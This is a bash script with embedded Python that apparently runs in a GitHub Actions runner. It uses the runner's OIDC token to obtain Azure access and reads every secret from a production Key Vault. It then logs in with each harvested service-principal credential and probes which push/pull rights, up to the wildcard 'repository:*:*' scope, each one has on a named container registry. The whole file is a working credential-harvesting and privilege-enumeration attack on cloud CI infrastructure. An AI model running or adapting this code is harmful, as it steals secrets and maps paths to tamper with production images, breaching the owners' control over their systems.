#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, base64, urllib.request, urllib.parse
def http(url, data=None, headers=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=30) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
REG="crtblplatprodx3euoz.azurecr.io"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
def oidc(sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,"scope":sc,
      "grant_type":"client_credentials","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":IDT}); return jg(b).get("access_token")
KVT=oidc("https://vault.azure.net/.default")
creds={"__oidc__":None}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
def armtok(c):
    if c is None: return oidc("https://management.azure.com/.default")
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],
       "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
    return jg(b).get("access_token")

SCOPES=["repository:tebamoto-reporting-api:pull,push","repository:catalog-api:pull,push",
        "repository:newrepo:pull,push","repository:*:*"]
for name,c in creds.items():
    t=armtok(c)
    if not t: print(f"{name:28} no ARM token"); continue
    st,b=http(f"https://{REG}/oauth2/exchange",{"grant_type":"access_token","service":REG,"tenant":TEN,"access_token":t})
    if st!=200: print(f"{name:28} ACR exchange {st}"); continue
    rt=jg(b)["refresh_token"]
    out=[]
    for sc in SCOPES:
        st,b=http(f"https://{REG}/oauth2/token",{"grant_type":"refresh_token","service":REG,"refresh_token":rt,"scope":sc})
        at=jg(b).get("access_token")
        acc=claims(at).get("access") if at else None
        out.append(f"{sc.split(':')[1]}={[a.get('actions') for a in acc] if acc else st}")
    print(f"{name:28} " + " | ".join(out))
PYEOF
echo "=== done ==="